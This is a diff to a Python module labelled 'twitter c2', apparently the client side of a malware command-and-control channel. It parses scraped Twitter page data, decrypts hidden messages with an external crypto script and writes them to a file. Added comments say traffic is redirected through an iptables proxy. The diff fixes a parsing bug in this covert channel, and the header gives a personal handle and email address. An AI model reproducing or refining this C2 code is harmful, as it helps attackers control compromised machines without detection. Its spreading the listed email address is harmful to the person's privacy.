@@ -1,5 +1,7 @@
 # module for twitter c2
 # kolache2 : a3829593@drdrb.net : flaky pastry
+# initialization requires an iptables command to redirect traffic through our proxy
+# tweet2.old needs to be created in the script's folder
 
 import urllib, os
 execfile("tweet2-crypto.py")
@@ -17,7 +19,7 @@ mostrecent = True
 c=0
 while c < len(urldata):
 	ccont = urldata.find("data-time", c)
-	recentmem = urldata[urldata.find("\"",ccont+1):urldata.find("\"", ccont+12)]
+	recentmem = urldata[urldata.find("\"",ccont)+1:urldata.find("\"", ccont+12)]
 	if recentmem == memstr:
 		break
 	if mostrecent:
@@ -35,6 +37,7 @@ while c < len(urldata):
 	encstr = prstr[prstr.find(">")+1:]
 	decstr = decryption(encstr)
 	filehdl.write(decstr)
+	filehdl.write("\n")
 	c = c + ccont + len(prstr)
 
 filehdl.close()
